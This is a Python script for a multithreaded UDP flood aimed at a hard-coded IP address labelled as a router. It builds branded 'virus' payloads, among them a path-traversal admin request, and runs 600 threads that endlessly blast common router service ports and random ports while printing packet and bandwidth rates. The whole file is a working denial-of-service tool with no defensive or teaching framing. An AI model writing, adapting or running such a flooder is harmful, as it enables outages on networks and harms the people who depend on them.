import socket
import threading
import time
import random
import struct
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

TARGET_IP = "62.109.121.42"  # YOUR ROUTER

# ==================== COLORAMA COLORS ====================
SK1_COLOR = Fore.YELLOW  # yellow_to_green = YELLOW
PPS_HIGH_COLOR = Fore.GREEN  # green_to_yellow = GREEN for high
PPS_LOW_COLOR = Fore.YELLOW  # green_to_yellow = YELLOW for low
BW_HIGH_COLOR = Fore.GREEN  # above 100 = GREEN
BW_MID_COLOR = Fore.YELLOW  # above 100 = YELLOW if lower
BW_LOW_COLOR = Fore.YELLOW  # under 100 = YELLOW
BW_VERY_LOW_COLOR = Fore.RED  # under 100 = RED if very low

# ==================== STS VIRUS HEADERS ====================
PPS_VIRUSES = [
    b'STS-RAPID\x00' + random.randbytes(56),
    b'STARSHIP-PPS\x00' + b'\xDE\xAD' * 26,
    b'ZAP-DEAD-STAR-STAR-STAR.DOT-DOT.DOT\x00' + b'\xFF\x00' * 22,
    b'STS-PPS-MARKER\x00' + b'\xCC' * 50,
    b'SIERRA-TEAM\x00' + b'\xAA\x55' * 26,
]

BW_VIRUSES = [
    b'STS-BW-NUKE\x00' + b'\x00' * 512 + b'\xFF' * 500,
    b'STARSHIP-BW\x00' + b'\xDE\xAD\xBE\xEF' * 250,
    b'ZAP-DEAD-BW-STAR-STAR-STAR\x00' + b'\xCA\xFE\xBA\xBE' * 250,
    b'STS-BW-MAX\x00' + random.randbytes(1000),
    b'SIERRA-BANDWIDTH\x00' + bytes([i % 256 for i in range(1000)]),
]

ROUTER_KILL_VIRUSES = [
    b'STS-DHCP\x00\x01\x01\x06\x00' + b'\xFF' * 300,
    b'STARSHIP-ARP\x00\xff\xff\xff\xff\xff\xff' + b'\x00' * 100,
    b'ZAP-NAT\x00' + bytes([random.randint(1, 254) for _ in range(500)]),
    b'WIFI-CRASH\x00\x08\x00' + b'\xAA' * 500,
    b'SIERRA-ADMIN\x00GET /admin/' + b'../' * 100,
]

STS_NAMES = [
    b'STRIKE-TEAM-SIERRA',
    b'STARSHIP',
    b'STS',
    b'ZAP-DEAD-STAR-STAR-STAR',
    b'STS-FINAL-BLOW',
]

# ==================== VIRUS GENERATORS ====================
def gen_pps_virus():
    virus = random.choice(PPS_VIRUSES)
    body_size = 64 - len(virus) - 10
    body = bytes([random.randint(0, 255) for _ in range(body_size)])
    signature = random.choice(STS_NAMES)
    return virus + body + signature[:10]

def gen_bw_virus():
    virus = random.choice(BW_VIRUSES)
    body_size = 1024 - len(virus) - 15
    body = bytes([random.choice([0x00, 0xFF, 0x80, 0x7F]) for _ in range(body_size)])
    signature = random.choice(STS_NAMES)
    return virus + body + signature[:15]

def gen_kill_virus():
    virus = random.choice(ROUTER_KILL_VIRUSES)
    body_size = 1472 - len(virus) - 20
    body = b'\xCC' * body_size
    signature = random.choice(STS_NAMES)
    return virus + body + signature[:20]

# ==================== THREAD CONFIG ====================
UDP_RAPID_PPS = 150
UDP_PPS = 150  
UDP_RAPID_BW = 150
UDP_BW = 150
TOTAL_THREADS = 600

total_packets = 0
total_bytes = 0

# ==================== ATTACK THREADS ====================
def udp_rapid_pps_virus(thread_id):
    global total_packets, total_bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ROUTER_PORTS = [53, 80, 443, 23, 21, 22, 25, 67, 68, 161, 162, 123, 1900, 7547]
    
    while True:
        try:
            for _ in range(30):
                virus = gen_pps_virus()
                for port in ROUTER_PORTS:
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += len(virus)
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

def udp_pps_virus(thread_id):
    global total_packets, total_bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            for _ in range(20):
                virus = gen_pps_virus()
                for _ in range(10):
                    port = random.randint(1, 65535)
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += len(virus)
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

def udp_rapid_bw_virus(thread_id):
    global total_packets, total_bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    BW_PORTS = [80, 443, 8080, 8443, 7547]
    
    while True:
        try:
            for _ in range(12):
                virus = gen_bw_virus()
                for port in BW_PORTS:
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += len(virus)
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

def udp_bandwidth_virus(thread_id):
    global total_packets, total_bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            for _ in range(8):
                virus = gen_kill_virus()
                for _ in range(8):
                    port = random.randint(1, 65535)
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += len(virus)
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== LAUNCH THREADS ====================
for i in range(UDP_RAPID_PPS):
    t = threading.Thread(target=udp_rapid_pps_virus, args=(i,))
    t.daemon = True
    t.start()

for i in range(UDP_PPS):
    t = threading.Thread(target=udp_pps_virus, args=(i,))
    t.daemon = True
    t.start()

for i in range(UDP_RAPID_BW):
    t = threading.Thread(target=udp_rapid_bw_virus, args=(i,))
    t.daemon = True
    t.start()

for i in range(UDP_BW):
    t = threading.Thread(target=udp_bandwidth_virus, args=(i,))
    t.daemon = True
    t.start()

# ==================== LOGGING WITH COLORAMA ====================
last_log = time.time()

while True:
    time.sleep(1)
    current = time.time()
    elapsed = current - last_log
    last_log = current
    
    # Calculate
    pps = int(total_packets / elapsed) if elapsed > 0 else 0
    mbps = (total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
    
    # Reset
    total_packets = 0
    total_bytes = 0
    
    # Color selection using colorama
    # SK1-SSALG = yellow (always)
    sk1_display = f"{SK1_COLOR}SK1-SSALG{Style.RESET_ALL}"
    
    # PPS = green_to_yellow
    if pps >= 50000:
        pps_display = f"{PPS_HIGH_COLOR}{pps:,}{Style.RESET_ALL}"
    else:
        pps_display = f"{PPS_LOW_COLOR}{pps:,}{Style.RESET_ALL}"
    
    # Bandwidth = above 100 green_to_yellow, under 100 yellow_to_red
    if mbps >= 100:
        if mbps >= 150:
            bw_display = f"{BW_HIGH_COLOR}{mbps:.1f}{Style.RESET_ALL}"
        else:
            bw_display = f"{BW_MID_COLOR}{mbps:.1f}{Style.RESET_ALL}"
    else:
        if mbps >= 50:
            bw_display = f"{BW_LOW_COLOR}{mbps:.1f}{Style.RESET_ALL}"
        else:
            bw_display = f"{BW_VERY_LOW_COLOR}{mbps:.1f}{Style.RESET_ALL}"
    
    # Print with colorama colors
    print(f"{sk1_display} | {pps_display}/s | {bw_display}Mbps")
